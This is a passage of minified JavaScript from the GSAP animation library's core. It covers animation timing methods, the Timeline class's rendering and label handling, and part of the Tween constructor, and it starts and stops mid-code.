                        ((this._ts > 0 && n < this._tDur) ||
                            (this._ts < 0 && n > 0) ||
                            (!this._tDur && !n)) &&
                        S1(this._dp, this, this._start - this._delay);
                }
                return (
                    (this._tTime !== n ||
                        (!this._dur && !i) ||
                        (this._initted && Math.abs(this._zTime) === Ce) ||
                        (!n && !this._initted && (this.add || this._ptLookup))) &&
                    (this._ts || (this._pTime = n), U5(this, n, i)),
                    this
                );
            }),
            (e.time = function(n, i) {
                return arguments.length
                    ? this.totalTime(
                        Math.min(this.totalDuration(), n + os(this)) %
                        (this._dur + this._rDelay) || (n ? this._dur : 0),
                        i
                    )
                    : this._time;
            }),
            (e.totalProgress = function(n, i) {
                return arguments.length
                    ? this.totalTime(this.totalDuration() * n, i)
                    : this.totalDuration()
                        ? Math.min(1, this._tTime / this._tDur)
                        : this.ratio;
            }),
            (e.progress = function(n, i) {
                return arguments.length
                    ? this.totalTime(
                        this.duration() *
                        (!this._yoyo || 1 & this.iteration() ? n : 1 - n) +
                        os(this),
                        i
                    )
                    : this.duration()
                        ? Math.min(1, this._time / this._dur)
                        : this.ratio;
            }),
            (e.iteration = function(n, i) {
                var s = this.duration() + this._rDelay;
                return arguments.length
                    ? this.totalTime(this._time + (n - 1) * s, i)
                    : this._repeat
                        ? dr(this._tTime, s) + 1
                        : 1;
            }),
            (e.timeScale = function(n) {
                if (!arguments.length) return this._rts === -Ce ? 0 : this._rts;
                if (this._rts === n) return this;
                var i =
                    this.parent && this._ts ? i2(this.parent._time, this) : this._tTime;
                return (
                    (this._rts = +n || 0),
                    (this._ts = this._ps || n === -Ce ? 0 : this._rts),
                    this.totalTime(_n(-this._delay, this._tDur, i), !0),
                    C2(this),
                    tl(this)
                );
            }),
            (e.paused = function(n) {
                return arguments.length
                    ? (this._ps !== n &&
                        ((this._ps = n),
                            n
                                ? ((this._pTime =
                                    this._tTime || Math.max(-this._delay, this.rawTime())),
                                    (this._ts = this._act = 0))
                                : (pr(),
                                    (this._ts = this._rts),
                                    this.totalTime(
                                        this.parent && !this.parent.smoothChildTiming
                                            ? this.rawTime()
                                            : this._tTime || this._pTime,
                                        1 === this.progress() &&
                                        Math.abs(this._zTime) !== Ce &&
                                        (this._tTime -= Ce)
                                    ))),
                        this)
                    : this._ps;
            }),
            (e.startTime = function(n) {
                if (arguments.length) {
                    this._start = n;
                    var i = this.parent || this._dp;
                    return (
                        i && (i._sort || !this.parent) && S1(i, this, n - this._delay), this
                    );
                }
                return this._start;
            }),
            (e.endTime = function(n) {
                return (
                    this._start +
                    (It(n) ? this.totalDuration() : this.duration()) /
                    Math.abs(this._ts || 1)
                );
            }),
            (e.rawTime = function(n) {
                var i = this.parent || this._dp;
                return i
                    ? n &&
                        (!this._ts ||
                            (this._repeat && this._time && this.totalProgress() < 1))
                        ? this._tTime % (this._dur + this._rDelay)
                        : this._ts
                            ? i2(i.rawTime(n), this)
                            : this._tTime
                    : this._tTime;
            }),
            (e.revert = function(n) {
                void 0 === n && (n = Q0);
                var i = mt;
                return (
                    (mt = n),
                    (this._initted || this._startAt) &&
                    (this.timeline && this.timeline.revert(n),
                        this.totalTime(-0.01, n.suppressEvents)),
                    "nested" !== this.data && !1 !== n.kill && this.kill(),
                    (mt = i),
                    this
                );
            }),
            (e.globalTime = function(n) {
                for (var i = this, s = arguments.length ? n : i.rawTime(); i;)
                    (s = i._start + s / (i._ts || 1)), (i = i._dp);
                return !this.parent && this._sat
                    ? this._sat.vars.immediateRender
                        ? -1
                        : this._sat.globalTime(n)
                    : s;
            }),
            (e.repeat = function(n) {
                return arguments.length
                    ? ((this._repeat = n === 1 / 0 ? -2 : n), ls(this))
                    : -2 === this._repeat
                        ? 1 / 0
                        : this._repeat;
            }),
            (e.repeatDelay = function(n) {
                if (arguments.length) {
                    var i = this._time;
                    return (this._rDelay = n), ls(this), i ? this.time(i) : this;
                }
                return this._rDelay;
            }),
            (e.yoyo = function(n) {
                return arguments.length ? ((this._yoyo = n), this) : this._yoyo;
            }),
            (e.seek = function(n, i) {
                return this.totalTime(jt(this, n), It(i));
            }),
            (e.restart = function(n, i) {
                return this.play().totalTime(n ? -this._delay : 0, It(i));
            }),
            (e.play = function(n, i) {
                return null != n && this.seek(n, i), this.reversed(!1).paused(!1);
            }),
            (e.reverse = function(n, i) {
                return (
                    null != n && this.seek(n || this.totalDuration(), i),
                    this.reversed(!0).paused(!1)
                );
            }),
            (e.pause = function(n, i) {
                return null != n && this.seek(n, i), this.paused(!0);
            }),
            (e.resume = function() {
                return this.paused(!1);
            }),
            (e.reversed = function(n) {
                return arguments.length
                    ? (!!n !== this.reversed() &&
                        this.timeScale(-this._rts || (n ? -Ce : 0)),
                        this)
                    : this._rts < 0;
            }),
            (e.invalidate = function() {
                return (this._initted = this._act = 0), (this._zTime = -Ce), this;
            }),
            (e.isActive = function() {
                var s,
                    n = this.parent || this._dp,
                    i = this._start;
                return !(
                    n &&
                    !(
                        this._ts &&
                        this._initted &&
                        n.isActive() &&
                        (s = n.rawTime(!0)) >= i &&
                        s < this.endTime(!0) - Ce
                    )
                );
            }),
            (e.eventCallback = function(n, i, s) {
                var o = this.vars;
                return arguments.length > 1
                    ? (i
                        ? ((o[n] = i),
                            s && (o[n + "Params"] = s),
                            "onUpdate" === n && (this._onUpdate = i))
                        : delete o[n],
                        this)
                    : o[n];
            }),
            (e.then = function(n) {
                var i = this;
                return new Promise(function(s) {
                    var o = Le(n) ? n : H5,
                        l = function() {
                            var c = i.then;
                            (i.then = null),
                                Le(o) && (o = o(i)) && (o.then || o === i) && (i.then = c),
                                s(o),
                                (i.then = c);
                        };
                    (i._initted && 1 === i.totalProgress() && i._ts >= 0) ||
                        (!i._tTime && i._ts < 0)
                        ? l()
                        : (i._prom = l);
                });
            }),
            (e.kill = function() {
                Ir(this);
            }),
            r
        );
    })();
r1(gr.prototype, {
    _time: 0,
    _start: 0,
    _end: 0,
    _tTime: 0,
    _tDur: 0,
    _dirty: 0,
    _repeat: 0,
    _yoyo: !1,
    parent: null,
    _initted: !1,
    _rDelay: 0,
    _ts: 1,
    _dp: 0,
    ratio: 0,
    _zTime: -Ce,
    _prom: 0,
    _ps: !1,
    _rts: 1,
});
var Rt = (function(r) {
    function e(n, i) {
        var s;
        return (
            void 0 === n && (n = {}),
            ((s = r.call(this, n) || this).labels = {}),
            (s.smoothChildTiming = !!n.smoothChildTiming),
            (s.autoRemoveChildren = !!n.autoRemoveChildren),
            (s._sort = It(n.sortChildren)),
            Ee && S1(n.parent || Ee, F1(s), i),
            n.reversed && s.reverse(),
            n.paused && s.paused(!0),
            n.scrollTrigger && V5(F1(s), n.scrollTrigger),
            s
        );
    }
    E5(e, r);
    var t = e.prototype;
    return (
        (t.to = function(i, s, o) {
            return Ur(0, arguments, this), this;
        }),
        (t.from = function(i, s, o) {
            return Ur(1, arguments, this), this;
        }),
        (t.fromTo = function(i, s, o, l) {
            return Ur(2, arguments, this), this;
        }),
        (t.set = function(i, s, o) {
            return (
                (s.duration = 0),
                (s.parent = this),
                zr(s).repeatDelay || (s.repeat = 0),
                (s.immediateRender = !!s.immediateRender),
                new Ke(i, s, jt(this, o), 1),
                this
            );
        }),
        (t.call = function(i, s, o) {
            return S1(this, Ke.delayedCall(0, i, s), o);
        }),
        (t.staggerTo = function(i, s, o, l, a, c, u) {
            return (
                (o.duration = s),
                (o.stagger = o.stagger || l),
                (o.onComplete = c),
                (o.onCompleteParams = u),
                (o.parent = this),
                new Ke(i, o, jt(this, a)),
                this
            );
        }),
        (t.staggerFrom = function(i, s, o, l, a, c, u) {
            return (
                (o.runBackwards = 1),
                (zr(o).immediateRender = It(o.immediateRender)),
                this.staggerTo(i, s, o, l, a, c, u)
            );
        }),
        (t.staggerFromTo = function(i, s, o, l, a, c, u, h) {
            return (
                (l.startAt = o),
                (zr(l).immediateRender = It(l.immediateRender)),
                this.staggerTo(i, s, l, a, c, u, h)
            );
        }),
        (t.render = function(i, s, o) {
            var f,
                d,
                m,
                p,
                y,
                v,
                S,
                w,
                C,
                O,
                D,
                M,
                l = this._time,
                a = this._dirty ? this.totalDuration() : this._tDur,
                c = this._dur,
                u = i <= 0 ? 0 : ct(i),
                h = this._zTime < 0 != i < 0 && (this._initted || !c);
            if (
                (this !== Ee && u > a && i >= 0 && (u = a), u !== this._tTime || o || h)
            ) {
                if (
                    (l !== this._time &&
                        c &&
                        ((u += this._time - l), (i += this._time - l)),
                        (f = u),
                        (C = this._start),
                        (v = !(w = this._ts)),
                        h && (c || (l = this._zTime), (i || !s) && (this._zTime = i)),
                        this._repeat)
                ) {
                    if (
                        ((D = this._yoyo),
                            (y = c + this._rDelay),
                            this._repeat < -1 && i < 0)
                    )
                        return this.totalTime(100 * y + i, s, o);
                    if (
                        ((f = ct(u % y)),
                            u === a
                                ? ((p = this._repeat), (f = c))
                                : ((p = ~~(u / y)) && p === u / y && ((f = c), p--),
                                    f > c && (f = c)),
                            (O = dr(this._tTime, y)),
                            !l && this._tTime && O !== p && (O = p),
                            D && 1 & p && ((f = c - f), (M = 1)),
                            p !== O && !this._lock)
                    ) {
                        var I = D && 1 & O,
                            R = I === (D && 1 & p);
                        if (
                            (p < O && (I = !I),
                                (l = I ? 0 : c),
                                (this._lock = 1),
                                (this.render(l || (M ? 0 : ct(p * y)), s, !c)._lock = 0),
                                (this._tTime = u),
                                !s && this.parent && e1(this, "onRepeat"),
                                this.vars.repeatRefresh && !M && (this.invalidate()._lock = 1),
                                (l && l !== this._time) ||
                                v !== !this._ts ||
                                (this.vars.onRepeat && !this.parent && !this._act))
                        )
                            return this;
                        if (
                            ((c = this._dur),
                                (a = this._tDur),
                                R &&
                                ((this._lock = 2),
                                    (l = I ? c : -1e-4),
                                    this.render(l, !0),
                                    this.vars.repeatRefresh && !M && this.invalidate()),
                                (this._lock = 0),
                                !this._ts && !v)
                        )
                            return this;
                        o4(this, M);
                    }
                }
                if (
                    (this._hasPause &&
                        !this._forcing &&
                        this._lock < 2 &&
                        (S = sl(this, ct(l), ct(f))) &&
                        (u -= f - (f = S._start)),
                        (this._tTime = u),
                        (this._time = f),
                        (this._act = !w),
                        this._initted ||
                        ((this._onUpdate = this.vars.onUpdate),
                            (this._initted = 1),
                            (this._zTime = i),
                            (l = 0)),
                        !l && f && !s && (e1(this, "onStart"), this._tTime !== u))
                )
                    return this;
                if (f >= l && i >= 0)
                    for (d = this._first; d;) {
                        if (
                            ((m = d._next), (d._act || f >= d._start) && d._ts && S !== d)
                        ) {
                            if (d.parent !== this) return this.render(i, s, o);
                            if (
                                (d.render(
                                    d._ts > 0
                                        ? (f - d._start) * d._ts
                                        : (d._dirty ? d.totalDuration() : d._tDur) +
                                        (f - d._start) * d._ts,
                                    s,
                                    o
                                ),
                                    f !== this._time || (!this._ts && !v))
                            ) {
                                (S = 0), m && (u += this._zTime = -Ce);
                                break;
                            }
                        }
                        d = m;
                    }
                else {
                    d = this._last;
                    for (var L = i < 0 ? i : f; d;) {
                        if (((m = d._prev), (d._act || L <= d._end) && d._ts && S !== d)) {
                            if (d.parent !== this) return this.render(i, s, o);
                            if (
                                (d.render(
                                    d._ts > 0
                                        ? (L - d._start) * d._ts
                                        : (d._dirty ? d.totalDuration() : d._tDur) +
                                        (L - d._start) * d._ts,
                                    s,
                                    o || (mt && (d._initted || d._startAt))
                                ),
                                    f !== this._time || (!this._ts && !v))
                            ) {
                                (S = 0), m && (u += this._zTime = L ? -Ce : Ce);
                                break;
                            }
                        }
                        d = m;
                    }
                }
                if (
                    S &&
                    !s &&
                    (this.pause(),
                        (S.render(f >= l ? 0 : -Ce)._zTime = f >= l ? 1 : -1),
                        this._ts)
                )
                    return (this._start = C), C2(this), this.render(i, s, o);
                this._onUpdate && !s && e1(this, "onUpdate", !0),
                    ((u === a && this._tTime >= this.totalDuration()) || (!u && l)) &&
                    (C === this._start || Math.abs(w) !== Math.abs(this._ts)) &&
                    (this._lock ||
                        ((i || !c) &&
                            ((u === a && this._ts > 0) || (!u && this._ts < 0)) &&
                            c3(this, 1),
                            !s &&
                            (!(i < 0) || l) &&
                            (u || l || !a) &&
                            (e1(
                                this,
                                u === a && i >= 0 ? "onComplete" : "onReverseComplete",
                                !0
                            ),
                                this._prom &&
                                !(u < a && this.timeScale() > 0) &&
                                this._prom())));
            }
            return this;
        }),
        (t.add = function(i, s) {
            var o = this;
            if ((U1(s) || (s = jt(this, s, i)), !(i instanceof gr))) {
                if (xt(i))
                    return (
                        i.forEach(function(l) {
                            return o.add(l, s);
                        }),
                        this
                    );
                if (it(i)) return this.addLabel(i, s);
                if (!Le(i)) return this;
                i = Ke.delayedCall(0, i);
            }
            return this !== i ? S1(this, i, s) : this;
        }),
        (t.getChildren = function(i, s, o, l) {
            void 0 === i && (i = !0),
                void 0 === s && (s = !0),
                void 0 === o && (o = !0),
                void 0 === l && (l = -Gt);
            for (var a = [], c = this._first; c;)
                c._start >= l &&
                    (c instanceof Ke
                        ? s && a.push(c)
                        : (o && a.push(c), i && a.push.apply(a, c.getChildren(!0, s, o)))),
                    (c = c._next);
            return a;
        }),
        (t.getById = function(i) {
            for (var s = this.getChildren(1, 1, 1), o = s.length; o--;)
                if (s[o].vars.id === i) return s[o];
        }),
        (t.remove = function(i) {
            return it(i)
                ? this.removeLabel(i)
                : Le(i)
                    ? this.killTweensOf(i)
                    : (T2(this, i),
                        i === this._recent && (this._recent = this._last),
                        k3(this));
        }),
        (t.totalTime = function(i, s) {
            return arguments.length
                ? ((this._forcing = 1),
                    !this._dp &&
                    this._ts &&
                    (this._start = ct(
                        $t.time -
                        (this._ts > 0
                            ? i / this._ts
                            : (this.totalDuration() - i) / -this._ts)
                    )),
                    r.prototype.totalTime.call(this, i, s),
                    (this._forcing = 0),
                    this)
                : this._tTime;
        }),
        (t.addLabel = function(i, s) {
            return (this.labels[i] = jt(this, s)), this;
        }),
        (t.removeLabel = function(i) {
            return delete this.labels[i], this;
        }),
        (t.addPause = function(i, s, o) {
            var l = Ke.delayedCall(0, s || on, o);
            return (
                (l.data = "isPause"), (this._hasPause = 1), S1(this, l, jt(this, i))
            );
        }),
        (t.removePause = function(i) {
            var s = this._first;
            for (i = jt(this, i); s;)
                s._start === i && "isPause" === s.data && c3(s), (s = s._next);
        }),
        (t.killTweensOf = function(i, s, o) {
            for (var l = this.getTweensOf(i, o), a = l.length; a--;)
                Q1 !== l[a] && l[a].kill(i, s);
            return this;
        }),
        (t.getTweensOf = function(i, s) {
            for (var u, o = [], l = Jt(i), a = this._first, c = U1(s); a;)
                a instanceof Ke
                    ? G0(a._targets, l) &&
                    (c
                        ? (!Q1 || (a._initted && a._ts)) &&
                        a.globalTime(0) <= s &&
                        a.globalTime(a.totalDuration()) > s
                        : !s || a.isActive()) &&
                    o.push(a)
                    : (u = a.getTweensOf(l, s)).length && o.push.apply(o, u),
                    (a = a._next);
            return o;
        }),
        (t.tweenTo = function(i, s) {
            s = s || {};
            var d,
                o = this,
                l = jt(o, i),
                a = s,
                c = a.startAt,
                u = a.onStart,
                h = a.onStartParams,
                f = a.immediateRender,
                m = Ke.to(
                    o,
                    r1(
                        {
                            ease: s.ease || "none",
                            lazy: !1,
                            immediateRender: !1,
                            time: l,
                            overwrite: "auto",
                            duration:
                                s.duration ||
                                Math.abs(
                                    (l - (c && "time" in c ? c.time : o._time)) / o.timeScale()
                                ) ||
                                Ce,
                            onStart: function() {
                                if ((o.pause(), !d)) {
                                    var y =
                                        s.duration ||
                                        Math.abs(
                                            (l - (c && "time" in c ? c.time : o._time)) /
                                            o.timeScale()
                                        );
                                    m._dur !== y && _r(m, y, 0, 1).render(m._time, !0, !0),
                                        (d = 1);
                                }
                                u && u.apply(m, h || []);
                            },
                        },
                        s
                    )
                );
            return f ? m.render(0) : m;
        }),
        (t.tweenFromTo = function(i, s, o) {
            return this.tweenTo(s, r1({ startAt: { time: jt(this, i) } }, o));
        }),
        (t.recent = function() {
            return this._recent;
        }),
        (t.nextLabel = function(i) {
            return void 0 === i && (i = this._time), as(this, jt(this, i));
        }),
        (t.previousLabel = function(i) {
            return void 0 === i && (i = this._time), as(this, jt(this, i), 1);
        }),
        (t.currentLabel = function(i) {
            return arguments.length
                ? this.seek(i, !0)
                : this.previousLabel(this._time + Ce);
        }),
        (t.shiftChildren = function(i, s, o) {
            void 0 === o && (o = 0);
            for (var c, l = this._first, a = this.labels; l;)
                l._start >= o && ((l._start += i), (l._end += i)), (l = l._next);
            if (s) for (c in a) a[c] >= o && (a[c] += i);
            return k3(this);
        }),
        (t.invalidate = function(i) {
            var s = this._first;
            for (this._lock = 0; s;) s.invalidate(i), (s = s._next);
            return r.prototype.invalidate.call(this, i);
        }),
        (t.clear = function(i) {
            void 0 === i && (i = !0);
            for (var o, s = this._first; s;) (o = s._next), this.remove(s), (s = o);
            return (
                this._dp && (this._time = this._tTime = this._pTime = 0),
                i && (this.labels = {}),
                k3(this)
            );
        }),
        (t.totalDuration = function(i) {
            var c,
                u,
                h,
                s = 0,
                o = this,
                l = o._last,
                a = Gt;
            if (arguments.length)
                return o.timeScale(
                    (o._repeat < 0 ? o.duration() : o.totalDuration()) /
                    (o.reversed() ? -i : i)
                );
            if (o._dirty) {
                for (h = o.parent; l;)
                    (c = l._prev),
                        l._dirty && l.totalDuration(),
                        (u = l._start) > a && o._sort && l._ts && !o._lock
                            ? ((o._lock = 1), (S1(o, l, u - l._delay, 1)._lock = 0))
                            : (a = u),
                        u < 0 &&
                        l._ts &&
                        ((s -= u),
                            ((!h && !o._dp) || (h && h.smoothChildTiming)) &&
                            ((o._start += u / o._ts), (o._time -= u), (o._tTime -= u)),
                            o.shiftChildren(-u, !1, -1 / 0),
                            (a = 0)),
                        l._end > s && l._ts && (s = l._end),
                        (l = c);
                _r(o, o === Ee && o._time > s ? o._time : s, 1, 1), (o._dirty = 0);
            }
            return o._tDur;
        }),
        (e.updateRoot = function(i) {
            if ((Ee._ts && (U5(Ee, i2(i, Ee)), ($5 = $t.frame)), $t.frame >= is)) {
                is += Wt.autoSleep || 120;
                var s = Ee._first;
                if ((!s || !s._ts) && Wt.autoSleep && $t._listeners.length < 2) {
                    for (; s && !s._ts;) s = s._next;
                    s || $t.sleep();
                }
            }
        }),
        e
    );
})(gr);
r1(Rt.prototype, { _lock: 0, _hasPause: 0, _forcing: 0 });
var Q1,
    xi,
    wl = function(e, t, n, i, s, o, l) {
        var h,
            f,
            d,
            m,
            p,
            y,
            v,
            S,
            a = new Ft(this._pt, e, t, 0, 1, _4, null, s),
            c = 0,
            u = 0;
        for (
            a.b = n,
            a.e = i,
            n += "",
            (v = ~(i += "").indexOf("random(")) && (i = ln(i)),
            o && (o((S = [n, i]), e, t), (n = S[0]), (i = S[1])),
            f = n.match(D2) || [];
            (h = D2.exec(i));

        )
            (m = h[0]),
                (p = i.substring(c, h.index)),
                d ? (d = (d + 1) % 5) : "rgba(" === p.substr(-5) && (d = 1),
                m !== f[u++] &&
                ((y = parseFloat(f[u - 1]) || 0),
                    (a._pt = {
                        _next: a._pt,
                        p: p || 1 === u ? p : ",",
                        s: y,
                        c: "=" === m.charAt(1) ? ir(y, m) - y : parseFloat(m) - y,
                        m: d && d < 4 ? Math.round : 0,
                    }),
                    (c = D2.lastIndex));
        return (
            (a.c = c < i.length ? i.substring(c, i.length) : ""),
            (a.fp = l),
            (F5.test(i) || v) && (a.e = 0),
            (this._pt = a),
            a
        );
    },
    a6 = function(e, t, n, i, s, o, l, a, c, u) {
        Le(i) && (i = i(s || 0, e, o));
        var m,
            h = e[t],
            f =
                "get" !== n
                    ? n
                    : Le(h)
                        ? c
                            ? e[
                                t.indexOf("set") || !Le(e["get" + t.substr(3)])
                                    ? t
                                    : "get" + t.substr(3)
                            ](c)
                            : e[t]()
                        : h,
            d = Le(h) ? (c ? Ol : h4) : u6;
        if (
            (it(i) &&
                (~i.indexOf("random(") && (i = ln(i)),
                    "=" === i.charAt(1) &&
                    ((m = ir(f, i) + (pt(f) || 0)) || 0 === m) &&
                    (i = m)),
                !u || f !== i || xi)
        )
            return isNaN(f * i) || "" === i
                ? (!h && !(t in e) && i6(t, i),
                    wl.call(this, e, t, f, i, d, a || Wt.stringFilter, c))
                : ((m = new Ft(
                    this._pt,
                    e,
                    t,
                    +f || 0,
                    i - (f || 0),
                    "boolean" == typeof h ? Ml : d4,
                    0,
                    d
                )),
                    c && (m.fp = c),
                    l && m.modifier(l, this, e),
                    (this._pt = m));
    },
    Tl = function(e, t, n, i, s) {
        if (
            (Le(e) && (e = Wr(e, s, t, n, i)),
                !M1(e) || (e.style && e.nodeType) || xt(e) || I5(e))
        )
            return it(e) ? Wr(e, s, t, n, i) : e;
        var l,
            o = {};
        for (l in e) o[l] = Wr(e[l], s, t, n, i);
        return o;
    },
    c4 = function(e, t, n, i, s, o) {
        var l, a, c, u;
        if (
            Zt[e] &&
            !1 !==
            (l = new Zt[e]()).init(
                s,
                l.rawVars ? t[e] : Tl(t[e], i, s, o, n),
                n,
                i,
                o
            ) &&
            ((n._pt = a = new Ft(n._pt, s, e, 0, 1, l.render, l, 0, l.priority)),
                n !== G3)
        )
            for (c = n._ptLookup[n._targets.indexOf(s)], u = l._props.length; u--;)
                c[l._props[u]] = a;
        return l;
    },
    c6 = function r(e, t, n) {
        var M,
            I,
            R,
            L,
            z,
            W,
            ue,
            te,
            J,
            U,
            Y,
            $,
            fe,
            i = e.vars,
            s = i.ease,
            o = i.startAt,
            l = i.immediateRender,
            a = i.lazy,
            c = i.onUpdate,
            u = i.onUpdateParams,
            h = i.callbackScope,
            f = i.runBackwards,
            d = i.yoyoEase,
            m = i.keyframes,
            p = i.autoRevert,
            y = e._dur,
            v = e._startAt,
            S = e._targets,
            w = e.parent,
            C = w && "nested" === w.data ? w.vars.targets : S,
            O = "auto" === e._overwrite && !t6,
            D = e.timeline;
        if (
            (D && (!m || !s) && (s = "none"),
                (e._ease = R3(s, hr.ease)),
                (e._yEase = d ? s4(R3(!0 === d ? s : d, hr.ease)) : 0),
                d &&
                e._yoyo &&
                !e._repeat &&
                ((d = e._yEase), (e._yEase = e._ease), (e._ease = d)),
                (e._from = !D && !!i.runBackwards),
                !D || (m && !i.stagger))
        ) {
            if (
                (($ = (te = S[0] ? E3(S[0]).harness : 0) && i[te.prop]),
                    (M = n2(i, s6)),
                    v &&
                    (v._zTime < 0 && v.progress(1),
                        t < 0 && f && l && !p ? v.render(-1, !0) : v.revert(f && y ? $n : q0),
                        (v._lazy = 0)),
                    o)
            ) {
                if (
                    (c3(
                        (e._startAt = Ke.set(
                            S,
                            r1(
                                {
                                    data: "isStart",
                                    overwrite: !1,
                                    parent: w,
                                    immediateRender: !0,
                                    lazy: !v && It(a),
                                    startAt: null,
                                    delay: 0,
                                    onUpdate: c,
                                    onUpdateParams: u,
                                    callbackScope: h,
                                    stagger: 0,
                                },
                                o
                            )
                        ))
                    ),
                        (e._startAt._dp = 0),
                        (e._startAt._sat = e),
                        t < 0 && (mt || (!l && !p)) && e._startAt.revert($n),
                        l && y && t <= 0 && n <= 0)
                )
                    return void (t && (e._zTime = t));
            } else if (f && y && !v)
                if (
                    (t && (l = !1),
                        (R = r1(
                            {
                                overwrite: !1,
                                data: "isFromStart",
                                lazy: l && !v && It(a),
                                immediateRender: l,
                                stagger: 0,
                                parent: w,
                            },
                            M
                        )),
                        $ && (R[te.prop] = $),
                        c3((e._startAt = Ke.set(S, R))),
                        (e._startAt._dp = 0),
                        (e._startAt._sat = e),
                        t < 0 && (mt ? e._startAt.revert($n) : e._startAt.render(-1, !0)),
                        (e._zTime = t),
                        l)
                ) {
                    if (!t) return;
                } else r(e._startAt, Ce, Ce);
            for (
                e._pt = e._ptCache = 0, a = (y && It(a)) || (a && !y), I = 0;
                I < S.length;
                I++
            ) {
                if (
                    ((ue = (z = S[I])._gsap || l6(S)[I]._gsap),
                        (e._ptLookup[I] = U = {}),
                        hi[ue.id] && s3.length && r2(),
                        (Y = C === S ? I : C.indexOf(z)),
                        te &&
                        !1 !== (J = new te()).init(z, $ || M, e, Y, C) &&
                        ((e._pt = L =
                            new Ft(e._pt, z, J.name, 0, 1, J.render, J, 0, J.priority)),
                            J._props.forEach(function(b) {
                                U[b] = L;
                            }),
                            J.priority && (W = 1)),
                        !te || $)
                )
                    for (R in M)
                        Zt[R] && (J = c4(R, M, e, Y, z, C))
                            ? J.priority && (W = 1)
                            : (U[R] = L =
                                a6.call(e, z, R, "get", M[R], Y, C, 0, i.stringFilter));
                e._op && e._op[I] && e.kill(z, e._op[I]),
                    O &&
                    e._pt &&
                    ((Q1 = e),
                        Ee.killTweensOf(z, U, e.globalTime(t)),
                        (fe = !e.parent),
                        (Q1 = 0)),
                    e._pt && a && (hi[ue.id] = 1);
            }
            W && p4(e), e._onInit && e._onInit(e);
        }
        (e._onUpdate = c),
            (e._initted = (!e._op || e._pt) && !fe),
            m && t <= 0 && D.render(Gt, !0, !0);
    },
    Cl = function(e, t, n, i, s, o, l) {
        var c,
            u,
            h,
            f,
            a = ((e._pt && e._ptCache) || (e._ptCache = {}))[t];
        if (!a)
            for (
                a = e._ptCache[t] = [], h = e._ptLookup, f = e._targets.length;
                f--;

            ) {
                if ((c = h[f][t]) && c.d && c.d._pt)
                    for (c = c.d._pt; c && c.p !== t && c.fp !== t;) c = c._next;
                if (!c) return (xi = 1), (e.vars[t] = "+=0"), c6(e, l), (xi = 0), 1;
                a.push(c);
            }
        for (f = a.length; f--;)
            ((c = (u = a[f])._pt || u).s =
                (!i && 0 !== i) || s ? c.s + (i || 0) + o * c.c : i),
                (c.c = n - c.s),
                u.e && (u.e = ze(n) + pt(u.e)),
                u.b && (u.b = c.s + pt(u.b));
    },
    Sl = function(e, t) {
        var s,
            o,
            l,
            a,
            n = e[0] ? E3(e[0]).harness : 0,
            i = n && n.aliases;
        if (!i) return t;
        for (o in ((s = B3({}, t)), i))
            if (o in s) for (l = (a = i[o].split(",")).length; l--;) s[a[l]] = s[o];
        return s;
    },
    Al = function(e, t, n, i) {
        var o,
            l,
            s = t.ease || i || "power1.inOut";
        if (xt(t))
            (l = n[e] || (n[e] = [])),
                t.forEach(function(a, c) {
                    return l.push({ t: (c / (t.length - 1)) * 100, v: a, e: s });
                });
        else
            for (o in t)
                (l = n[o] || (n[o] = [])),
                    "ease" === o || l.push({ t: parseFloat(e), v: t[o], e: s });
    },
    Wr = function(e, t, n, i, s) {
        return Le(e)
            ? e.call(t, n, i, s)
            : it(e) && ~e.indexOf("random(")
                ? ln(e)
                : e;
    },
    u4 = o6 + "repeat,repeatDelay,yoyo,repeatRefresh,yoyoEase,autoRevert",
    f4 = {};
Dt(u4 + ",id,stagger,delay,duration,paused,scrollTrigger", function(r) {
    return (f4[r] = 1);
});
var Ke = (function(r) {
    function e(n, i, s, o) {
        var l;
        "number" == typeof i && ((s.duration = i), (i = s), (s = null));
        var C,
            O,
            D,
            M,
            I,
            R,
            L,
            z,
            a = (l = r.call(this, o ? i : zr(i)) || this).vars,
            c = a.duration,
            u = a.delay,
            h = a.immediateRender,
            f = a.stagger,
            d = a.overwrite,
            m = a.keyframes,
            p = a.defaults,
            y = a.scrollTrigger,
            v = a.yoyoEase,
            S = i.parent || Ee,
            w = (xt(n) || I5(n) ? U1(n[0]) : "length" in i) ? [n] : Jt(n);
        if (
            ((l._targets = w.length
                ? l6(w)
                : t2(
                    "GSAP target " + n + " not found. https://greensock.com",
                    !Wt.nullTargetWarn
                ) || []),
                (l._ptLookup = []),
                (l._overwrite = d),
                m || f || bn(c) || bn(u))
        ) {
            if (
                ((i = l.vars),
                    (C = l.timeline =
                        new Rt({
                            data: "nested",
                            defaults: p || {},
                            targets: S && "nested" === S.data ? S.vars.targets : w,
                        })).kill(),
                    (C.parent = C._dp = F1(l)),
                    (C._start = 0),
                    f || bn(c) || bn(u))
            ) {
                if (((M = w.length), (L = f && Q5(f)), M1(f)))
                    for (I in f) ~u4.indexOf(I) && (z || (z = {}), (z[I] = f[I]));
                for (O = 0; O < M; O++)
                    ((D = n2(i, f4)).stagger = 0),
                        v && (D.yoyoEase = v),
                        z && B3(D, z),
                        (R = w[O]),
                        (D.duration = +Wr(c, F1(l), O, R, w)),
                        (D.delay = (+Wr(u, F1(l), O, R, w) || 0) - l._delay),
                        !f &&
                        1 === M &&
                        D.delay &&
                        ((l._delay = u = D.delay), (l._start += u), (D.delay = 0)),
                        C.to(R, D, L ? L(O, R, w) : 0),
                        (C._ease = pe.none);
                C.duration() ? (c = u = 0) : (l.timeline = 0);
            } else if (m) {
                zr(r1(C.vars.defaults, { ease: "none" })),
                    (C._ease = R3(m.ease || i.ease || "none"));
                var ue,
                    te,
                    J,
                    W = 0;
                if (xt(m))
                    m.forEach(function(U) {
                        return C.to(w, U, ">");
                    }),
                        C.duration();
                else {
                    for (I in ((D = {}), m))
                        "ease" === I || "easeEach" === I || Al(I, m[I], D, m.easeEach);
                    for (I in D)
                        for (
                            ue = D[I].sort(function(U, Y) {
                                return U.t - Y.t;
                            }),
                            W = 0,
                            O = 0;
                            O < ue.length;
                            O++
                        )
                            ((J = {
                                ease: (te = ue[O]).e,
                                duration: ((te.t - (O ? ue[O - 1].t : 0)) / 100) * c,
                            })[I] = te.v),
                                C.to(w, J, W),
                                (W += J.duration);
                    C.duration() < c && C.to({}, { duration: c - C.duration() });
                }
            }
            c || l.duration((c = C.duration()));
        } else l.timeline = 0;
        return (
            !0 === d && !t6 && ((Q1 = F1(l)), Ee.killTweensOf(w), (Q1 = 0)),
            S1(S, F1(l), s),
            i.reversed && l.reverse(),
            i.paused && l.paused(!0),
            (h ||
                (!c &&
                    !m &&
                    l._start === ct(S._time) &&
                    It(h) &&
                    rl(F1(l)) &&
                    "nested" !== S.data)) &&
